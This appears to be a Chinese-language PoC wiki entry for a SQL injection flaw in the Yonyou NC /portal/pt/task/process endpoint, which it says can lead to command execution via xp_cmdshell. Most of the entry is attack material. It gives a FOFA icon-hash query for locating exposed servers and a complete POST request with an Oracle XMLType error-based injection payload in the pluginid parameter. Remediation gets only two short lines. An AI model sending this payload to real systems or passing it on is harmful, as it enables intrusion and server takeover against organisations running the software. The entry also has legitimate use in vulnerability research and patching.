---
fofa: "icon_hash="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 用友NC portalpttaskprocess SQL注入漏洞

# 漏洞描述

用友NC /portal/pt/task/process 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。

# 影响版本

用友NC

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：icon_hash="1085941792"

POC/EXP：

POST /portal/pt/task/process?pageId=login HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

id=1&oracle=1&pluginid=1{{urlescape(' AND 7194=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (7194=7194) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(120)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)-- dJyN)}}

![image-20241125204818876](./.resource/用友NCportalpttaskprocessSQL注入漏洞/media/image-20241125204818876.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
